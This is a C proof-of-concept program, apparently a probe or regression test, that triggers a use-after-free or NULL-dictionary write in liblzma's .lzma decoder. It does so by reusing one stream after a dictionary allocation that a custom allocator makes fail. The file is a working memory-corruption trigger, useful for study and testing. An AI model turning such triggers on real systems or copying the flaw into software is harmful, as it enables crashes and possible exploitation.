// SPDX-License-Identifier: 0BSD
//
// Proof-of-concept probe for a delocalized memory-safety defect in liblzma's
// LZMA_Alone (.lzma) decoder reuse path.
//
// The program uses only the public liblzma API (<lzma.h>) with in-contract
// input: a caller-supplied lzma_allocator (a documented public feature) and
// two small, valid .lzma streams. It reuses a single lzma_stream across
// several lzma_alone_decoder() initializations, exactly as permitted by the
// API. On a tree where the decoder reuse is handled safely this runs cleanly;
// on the defective tree the third decode dereferences a stale/NULL dictionary
// pointer and the sanitizer aborts.

#include <lzma.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Reject "large" allocations so that resizing the dictionary to 8 MiB fails
// while the 4 KiB dictionary and all bookkeeping allocations succeed.
#define TOO_BIG_ALLOC (1U << 20)

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	(void)nmemb;
	if (size >= TOO_BIG_ALLOC)
		return NULL;
	return malloc(size);
}

static lzma_allocator my_allocator = { &my_alloc, NULL, NULL };

// A valid .lzma stream with a 4 KiB dictionary (dict_size = 0x00001000).
static const uint8_t lzma_small[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0x00, 0x24, 0x19, 0x49, 0x98, 0x6f, 0x05, 0x15, 0x27, 0x27, 0x0d,
	0x76, 0x78, 0xd0, 0x2a, 0x68, 0x17, 0x15, 0xff, 0xff, 0x75, 0xf8, 0x00,
	0x00
};

int
main(void)
{
	// Same stream but with the header dictionary size set to 8 MiB.
	uint8_t lzma_big[sizeof(lzma_small)];
	memcpy(lzma_big, lzma_small, sizeof(lzma_small));
	lzma_big[2] = 0x00;
	lzma_big[3] = 0x80; // dict_size = 0x00800000 = 8 MiB

	uint8_t out[256];
	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	// (1) Decode with the small dictionary: allocates a small dict buffer.
	if (lzma_alone_decoder(&strm, 64U << 20) != LZMA_OK)
		return 2;
	strm.next_in = lzma_small;
	strm.avail_in = sizeof(lzma_small);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_STREAM_END)
		return 2;

	// (2) Reuse the stream and ask for an 8 MiB dictionary. The dictionary
	// reallocation fails (allocator rejects >= 1 MiB) -> LZMA_MEM_ERROR.
	if (lzma_alone_decoder(&strm, 64U << 20) != LZMA_OK)
		return 2;
	strm.next_in = lzma_big;
	strm.avail_in = sizeof(lzma_big);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_MEM_ERROR)
		return 2;

	// (3) Reuse once more with the small dictionary. On a correct tree the
	// decoder state is reset and this decodes cleanly. On the defective
	// tree the dictionary buffer was freed but its size was left stale and
	// the partially-initialized coder was kept for reuse, so decoding now
	// writes through a stale/NULL dictionary pointer.
	if (lzma_alone_decoder(&strm, 64U << 20) != LZMA_OK)
		return 2;
	strm.next_in = lzma_small;
	strm.avail_in = sizeof(lzma_small);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	lzma_ret ret = lzma_code(&strm, LZMA_FINISH);
	if (ret != LZMA_STREAM_END)
		return 2;

	lzma_end(&strm);
	printf("ok\n");
	return 0;
}
